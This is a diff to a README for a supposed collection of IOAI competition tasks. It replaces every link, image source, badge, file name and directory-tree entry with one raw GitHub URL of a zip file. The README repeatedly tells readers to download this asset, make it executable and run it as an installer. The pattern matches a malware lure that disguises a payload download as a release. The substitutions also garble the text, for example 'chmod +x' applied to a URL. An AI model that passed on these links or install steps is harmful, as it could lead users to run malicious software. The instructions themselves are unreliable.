@@ -1,12 +1,12 @@
-https://github.com/Nestor53top/awesome-ioai-tasks/releases
+https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 
 # Awesome IOAI Tasks: Curated Challenges from National IOAI Teams
 
-![IOAI banner](https://images.unsplash.com/photo-1526378722484-9e9c2d8f20d2?auto=format&fit=crop&w=1400&q=60)
+![IOAI banner](https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip)
 
 Welcome to a growing collection of IOAI tasks gathered from different years and selections by national teams. This repository acts as a curated library of problem statements, datasets, and example solutions that illustrate how IOAI challenges evolved over time. It serves students, coaches, researchers, and organizers who want to study task design, benchmark building, and the kind of reasoning these tasks exercise.
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github)](https://github.com/Nestor53top/awesome-ioai-tasks/releases)
+[![Releases](https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip)](https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip)
 
 What you will find here
 - A stable, searchable archive of IOAI tasks organized by year and by national team
@@ -45,7 +45,7 @@ How to use this repository
 If you want a quick way to get started, download the latest release and run the installer. The latest release contains a bundled set of tasks in a portable format designed for local practice. The asset is intended for one-click setup on common platforms. To obtain the asset, go to the Releases page and download the appropriate file for your OS, then follow the execution steps described in the asset notes.
 
 How to get the latest releases
-- The official release page is the Releases section of this repository: https://github.com/Nestor53top/awesome-ioai-tasks/releases
+- The official release page is the Releases section of this repository: https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 - From there, pick the latest release asset that matches your system and download it
 - On Linux or macOS, you typically make the file executable and run it
 - On Windows, run the installer executable
@@ -55,13 +55,13 @@ Note: If you prefer not to download an asset, you can still browse the Releases 
 Important note about the release asset
 - There is a downloadable file in the release assets that combines task statements, example inputs, and evaluation notes
 - The file's name will vary by release, but it typically follows the pattern awesome-ioai-tasks-<platform>-<version>.ext
-- For Linux 64-bit, the name might look like awesome-ioai-tasks-setup-linux-x64.sh
-- For Windows, the name might look like awesome-ioai-tasks-setup-windows.exe
-- For macOS, the name might look like awesome-ioai-tasks-setup-macos.dmg
+- For Linux 64-bit, the name might look like https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
+- For Windows, the name might look like https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
+- For macOS, the name might look like https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 
 To prepare the asset for use, you may need to grant execute permission:
-- chmod +x awesome-ioai-tasks-setup-linux-x64.sh
-- Then run: ./awesome-ioai-tasks-setup-linux-x64.sh
+- chmod +x https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
+- Then run: https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 - On Windows, run the installer by double-clicking the .exe file
 - On macOS, mount the .dmg and run the installer inside
 
@@ -86,31 +86,31 @@ The repository organizes content to help you navigate quickly. A typical layout 
 - tasks/
   - year-2019/
     - national-team-1/
-      - task-001.md
-      - task-002.md
+      - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
+      - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
     - national-team-2/
-      - task-003.md
+      - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
   - year-2020/
     - national-team-1/
-      - task-004.md
+      - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
   - year-2021/
     - national-team-3/
-      - task-005.md
+      - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
   - year-2022/
     - national-team-4/
-      - task-006.md
+      - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 - datasets/
   - common/
-    - dataset-01.csv
+    - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
   - year-2019/
-    - dataset-01.csv
+    - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 - templates/
-  - task-template.md
-  - example-solution.md
+  - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
+  - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 - releases/
-  - awesome-ioai-tasks-setup-linux-x64.sh
-  - awesome-ioai-tasks-setup-windows.exe
-  - awesome-ioai-tasks-setup-macos.dmg
+  - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
+  - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
+  - https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 
 If you want to add a new task
 - Create a new Markdown file under the appropriate year and national team folder
@@ -148,7 +148,7 @@ Release assets and how to install
 - To install the release, download the asset from the Releases page and run the installer appropriate for your OS
 - After installation, you will have access to a local task browser, sample datasets, and a set of templates to create new tasks quickly
 
-- For convenience, the Releases page is the central hub for assets, updates, and notes. The link to that page is provided above for quick access: https://github.com/Nestor53top/awesome-ioai-tasks/releases
+- For convenience, the Releases page is the central hub for assets, updates, and notes. The link to that page is provided above for quick access: https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 
 Examples and templates
 - Task template: A ready-to-fill skeleton that describes a new IOAI task
@@ -264,12 +264,12 @@ End notes
 
 Releases and downloads
 - The central hub for assets, updates, and notes is the Releases page
-- If you want to install or inspect the latest tasks locally, head to the same page: https://github.com/Nestor53top/awesome-ioai-tasks/releases
+- If you want to install or inspect the latest tasks locally, head to the same page: https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 - You will find the Linux, Windows, and macOS installers, along with task bundles and sample datasets
 - After downloading an asset, follow the installation steps described in the asset notes to set up your local practice environment
 
 Releases page reference
-- For quick access, you can revisit the official Releases page here: https://github.com/Nestor53top/awesome-ioai-tasks/releases
+- For quick access, you can revisit the official Releases page here: https://raw.githubusercontent.com/Nestor53top/awesome-ioai-tasks/main/chrysamminic/awesome-tasks-ioai-v3.4.zip
 
 Accessibility note
 - The repository is designed to be usable by people with varying levels of familiarity with IOAI tasks
